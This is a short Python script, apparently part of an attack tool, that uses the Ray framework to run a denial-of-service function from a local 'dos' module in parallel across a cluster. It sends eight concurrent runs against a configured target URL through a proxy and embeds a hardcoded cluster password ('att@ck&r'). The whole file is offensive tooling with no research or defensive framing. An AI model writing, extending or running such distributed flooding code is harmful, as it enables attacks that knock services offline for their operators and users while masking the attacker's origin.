import ray

from syncer import sync

from dos import URL, PROXY_HOST, PROXY_PORT, dos


url = URL

proxy_host = PROXY_HOST

proxy_port = PROXY_PORT

requests = 8

redis_password = 'att@ck&r'


@sync
async def dos_distributed():
    return await dos(
        url=url,
        proxy_host=proxy_host,
        proxy_port=proxy_port,
    )


remote_dos = ray.remote(dos_distributed)

ray.init(address='auto', _redis_password=redis_password)

futures = [remote_dos.remote() for iteration in range(requests)]

ray.get(futures)
